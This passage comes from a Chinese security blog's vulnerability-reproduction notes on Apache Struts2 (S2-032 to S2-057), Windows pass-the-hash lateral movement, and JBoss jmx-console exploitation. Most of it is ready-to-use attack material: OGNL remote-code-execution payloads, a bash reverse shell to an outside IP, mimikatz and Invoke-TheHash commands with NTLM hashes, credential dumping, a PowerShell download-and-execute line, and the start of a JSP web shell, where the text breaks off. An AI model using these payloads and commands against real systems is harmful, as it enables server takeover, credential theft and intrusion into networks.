class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">entry</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">jdk.nashorn.internal.objects.NativeString</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span> </span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>注意修改host</p><p>然后注意修改command 部分</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash -i &gt;<span class="hljs-symbol">&amp;amp;</span> /dev/tcp/8.219.161.88/9090 0&gt;<span class="hljs-symbol">&amp;amp;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br></code></pre></td></tr></table></figure><p>kali 模拟vps 监听端口</p><p>然后发送数据包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210222300007.png" alt="image-20240210222300007"></p><p>利用成功</p><h1 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h1><p>0x00</p><p>使用Struts2Scan搜索存在什么漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210222723131.png" alt="image-20240210222723131"></p><p>发现存在032漏洞</p><p>0x01</p><p>尝试利用</p><p>payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?method:<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%3</span>d<span class="hljs-variable">%40</span>ognl.OgnlContext<span class="hljs-variable">%20</span><span class="hljs-variable">%40</span>DEFAULT_MEMBER_ACCESS<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.exec<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>parameters.command<span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>B<span class="hljs-number">0</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%29</span>.getInputStream<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>b<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>java.io.InputStreamReader<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>a<span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>java.io.BufferedReader<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>b<span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>d<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>char<span class="hljs-variable">%5</span>B<span class="hljs-number">51020</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span><span class="hljs-keyword">c</span>.read<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>kxlzx<span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%40</span>org.apache.struts<span class="hljs-number">2</span>.ServletActionContext<span class="hljs-variable">%40</span>getResponse<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.getWriter<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>kxlzx.println<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>kxlzx.close&amp;command<span class="hljs-operator">=</span>whoami<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210222945072.png" alt="image-20240210222945072"></p><p>利用成功</p><h1 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h1><p>使用脚本跑，发现不存在该漏洞…</p><p>就假装通过扫描器，我知道存在这个漏洞</p><p>0x00</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210223829532.png" alt="image-20240210223829532"></p><p>使用payload </p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(<span class="hljs-string">&#x27;id&#x27;</span>).getInputStream())).(#q)&#125;<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210223952438.png" alt="image-20240210223952438"></p><p>依次填入</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210224020375.png" alt="image-20240210224020375"></p><p>成功执行命令</p><h1 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h1><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210225959509.png" alt="image-20240210225959509"></p><p>还是没有被检测出来</p><p>0x00</p><p>访问路径</p><blockquote><p><a href="http://192.168.79.128:8080/hello.action">http://192.168.79.128:8080/hello.action</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/20240210230151.png"></p><p>然后使用payload</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;<br><br></code></pre></td></tr></table></figure><p>注意有一个空行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210230317175.png" alt="image-20240210230317175"></p><h1 id="S2-057"><a href="#S2-057" class="headerlink" title="S2-057"></a>S2-057</h1><p>这个相对于前面的来说比较艰难</p><p>当Struts2的配置满足以下条件时：</p><blockquote><p> alwaysSelectFullNamespace值为true</p><p> action元素未设置namespace属性，或使用了通配符  </p></blockquote><p>namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。  </p><p>0x00</p><p>payload</p><p><strong>2.3.20 版本</strong>  </p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.<span class="hljs-keyword">print</span>%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="hljs-keyword">exec</span>%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action<br></code></pre></td></tr></table></figure><p> <strong>2.3.34 版本</strong>  </p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.<span class="hljs-keyword">print</span>%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="hljs-keyword">exec</span>%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action<br></code></pre></td></tr></table></figure><p>漏洞验证，使用脚本发现还是没有扫描出漏洞</p><p>直接使用脚本，然后</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210230819514.png" alt="image-20240210230819514"></p><p>复现成功</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>域横向移动</title>
    <link href="/2024/02/10/%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2024/02/10/%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="PTH简介"><a href="#PTH简介" class="headerlink" title="PTH简介"></a>PTH简介</h1><p>PASS THE Hash 也叫 Hash 传递攻击，简称 PTH。模拟用户登录不需要用户明文密码，就可以直接  用获取到的 Hash 来登录目标系统。  </p><p>利用成功的前提条件是：  </p><ul><li>开启 445 端口 SMB 服务  </li><li>开启 admin$ 共享</li></ul><h1 id="Metasploit-psexec模块"><a href="#Metasploit-psexec模块" class="headerlink" title="Metasploit psexec模块"></a>Metasploit psexec模块</h1><p>通过获取的Meterpreter会话执行hashdump得到用户hash值  </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hashdump</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210155140579.png" alt="image-20240210155140579"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi </span><br><span class="hljs-attribute">creds_all</span><br></code></pre></td></tr></table></figure><p>注意该模块是需要管理员权限</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210160238443.png" alt="image-20240210160238443"></p><p>使用 msf psexec模块</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210160638079.png" alt="image-20240210160638079"></p><p>就直接使用他的hash值，就不需要具体的密码了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210165548361.png" alt="image-20240210165548361"></p><p>利用成功</p><p>这个就是hash传递 也称为 PTH</p><p>如果是使用域用户登录的话，那么就要指定smbdomain，然后使用域用户的hash</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210162329416.png" alt="image-20240210162329416"></p><p>注意</p><p>如果是攻击内网的主机记得添加代理</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">setg proxies</span><br></code></pre></td></tr></table></figure><h1 id="cs-hash传递攻击"><a href="#cs-hash传递攻击" class="headerlink" title="cs hash传递攻击"></a>cs hash传递攻击</h1><ol><li>创建一个监听器</li></ol><p>   选择 bind 或者是 smb </p><p>   因为是在内网，使用bind 符合网络环境</p><ol start="2"><li><p>使用psexec进行迁移</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210173949706.png" alt="image-20240210173949706"></p></li></ol><p>还可以使用 minikatz 的方式进行hash传递</p><h1 id="Mimikatz-Hash传递攻击"><a href="#Mimikatz-Hash传递攻击" class="headerlink" title="Mimikatz Hash传递攻击"></a>Mimikatz Hash传递攻击</h1><p>  当我们获得了内网中一台主机的NTLM哈希值，我们可以利用mimikatz对这个主机进行哈希传递攻  击，执行命令成功后将会反弹回cmd  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:august /domain:10.10.10.20 /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240210200220058.png" alt="image-20240210200220058"></p><p>  在弹出的cmd中，我们还可以直接连接该主机，还可以查看目录文件等操作  </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net use \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span>\c<span class="hljs-variable">$</span><br><span class="hljs-built_in">dir</span> \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span>\c<span class="hljs-variable">$</span><br><span class="hljs-built_in">copy</span> <span class="hljs-number">1</span>.exe \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span>\c<span class="hljs-variable">$</span><br>net use <span class="hljs-built_in">h</span>: \\<span class="hljs-number">10.10</span>.<span class="hljs-number">10.20</span>\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><h1 id="Powershell-Hash传递攻击"><a href="#Powershell-Hash传递攻击" class="headerlink" title="Powershell Hash传递攻击"></a>Powershell Hash传递攻击</h1><p>  需要同时加载Invoke-WMIExec.ps1、Invoke-TheHash.ps1 </p><blockquote><p>  <a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a>  </p></blockquote><p>记载脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-exec</span> bypass<br><br><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-WMIExec</span>.ps1<br><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-TheHash</span>.ps1<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-exec</span> bypass<br><br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.3.86:8000/Invoke-WMIExec.ps1&#x27;</span>);<br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://192.168.3.86:8000/Invoke-TheHash.ps1&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Invoke</span>-TheHash -Type WMIExec -Target <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> -Username administrator -Hash <span class="hljs-number">579110</span>c49145015c47ecd267657d3174<br></code></pre></td></tr></table></figure><p>批量撞指定的内网机器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">工作组：<br><span class="hljs-built_in">PS</span> C:\Users\Administrator&gt; <span class="hljs-built_in">Invoke-TheHash</span> <span class="hljs-literal">-Type</span> WMIExec <span class="hljs-literal">-Target</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-Username</span> administrator <span class="hljs-literal">-Hash</span> b4e535a9bb56bcc084602062c9e2a9d4<br><br>域：<br><span class="hljs-built_in">PS</span> C:\Users\Administrator&gt; <span class="hljs-built_in">Invoke-TheHash</span> <span class="hljs-literal">-Type</span> WMIExec <span class="hljs-literal">-Target</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.0</span>/<span class="hljs-number">24</span> <span class="hljs-literal">-Domain</span> mingy <span class="hljs-literal">-Username</span> administrator <span class="hljs-literal">-Hash</span> e1c61709dffcf154ac9d77b5024f6d10<br></code></pre></td></tr></table></figure><h1 id="利用Impacket-Hash-传递攻击"><a href="#利用Impacket-Hash-传递攻击" class="headerlink" title="利用Impacket Hash 传递攻击"></a>利用Impacket Hash 传递攻击</h1><p>该脚本是通过445端口进行通信的，不是135</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 域用户</span><br><span class="hljs-attribute">wmiexec</span>.exe -hashes :<span class="hljs-number">518</span>B98AD4178A53695DC997AA02D455C 域名/administrator@<span class="hljs-number">192.168.3.123</span> <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">命令执行：<br>wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">45</span>a524862326cb9e7d85af40<span class="hljs-number">17a000f0</span> administrator@<span class="hljs-number">10.10.10.20</span> &quot;whoami&quot;<br><br>得到shell：<br>smbexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">45</span>a524862326cb9e7d85af40<span class="hljs-number">17a000f0</span> administrator@<span class="hljs-number">10.10.10.20</span><br></code></pre></td></tr></table></figure><p>Linux </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 工作组</span><br><span class="hljs-attribute">python</span> wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">45</span>a524862326cb9e7d85af4017a000f0 administrator@<span class="hljs-number">10.10.10.20</span> <span class="hljs-string">&quot;ipconfig&quot;</span><br><br><span class="hljs-comment"># 域用户</span><br><span class="hljs-attribute">python</span> wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">45</span>a524862326cb9e7d85af4017a000f0 域名/administrator@<span class="hljs-number">10.10.10.20</span> <span class="hljs-string">&quot;ipconfig&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jboss漏洞整理</title>
    <link href="/2024/02/09/%E6%95%B4%E7%90%86/jboss%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <url>/2024/02/09/%E6%95%B4%E7%90%86/jboss%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="jboss-漏洞复现"><a href="#jboss-漏洞复现" class="headerlink" title="jboss 漏洞复现"></a>jboss 漏洞复现</h1><h2 id="jmx-console"><a href="#jmx-console" class="headerlink" title="jmx-console"></a>jmx-console</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209194431332.png" alt="image-20240209194431332"></p><p>发现后台就直接访问后后台，然后尝试部署war包</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209195016808.png" alt="image-20240209195016808"></p><p><img src="D:\hexo\source_posts\整理\jboss漏洞整理.assets\image-20240209194948829.png" alt="image-20240209194948829"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209195057978.png" alt="image-20240209195057978"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209195118722.png" alt="image-20240209195118722"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209195257269.png" alt="image-20240209195257269"><br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209195348273.png" alt="image-20240209195348273"></p><p>利用成功</p><h2 id="jboss-WeakPasswd"><a href="#jboss-WeakPasswd" class="headerlink" title="jboss-WeakPasswd"></a>jboss-WeakPasswd</h2><p>尝试访问console 的时候发现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209195558569.png" alt="image-20240209195558569"></p><p>尝试</p><blockquote><p>admin&#x2F;admin</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209195921556.png" alt="image-20240209195921556"></p><p>之后的操作就和上面的一样了</p><h2 id="CVE-2007-1036"><a href="#CVE-2007-1036" class="headerlink" title="CVE-2007-1036"></a>CVE-2007-1036</h2><p>0x00  漏洞简介</p><blockquote><p>此漏洞主要是由于JBoss中 &#x2F;jmx-console&#x2F;HtmlAdaptor 路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中 jboss.admin -&gt;DeploymentFileRepository -&gt; store() 方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。但是通过实验发现，arg1和arg2可以进行文件的拼接，例如 arg1&#x3D;she，arg2&#x3D;ll.jsp 。这个时候服务器还是会进行拼接，将 shell.jsp 传入到指定路径下。</p></blockquote><p>0x01  影响版本</p><blockquote><p>jboss4.<strong>x</strong>以下</p></blockquote><p>0x02  漏洞利用</p><p>使用payload</p><blockquote><p><a href="http://xx.xx.xx.xx/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository">http://xx.xx.xx.xx/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</a></p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/weblogic%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240209200238153.png" alt="image-20240209200238153"></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe">p1   job1.war<br>p2   job1<br>p3   .jsp<br>p4   &lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt; <br>&lt;% <span class="hljs-keyword">String</span> cmd = request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>); <span class="hljs-keyword">String</span> output = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123; <span class="hljs-keyword">String</span> s = 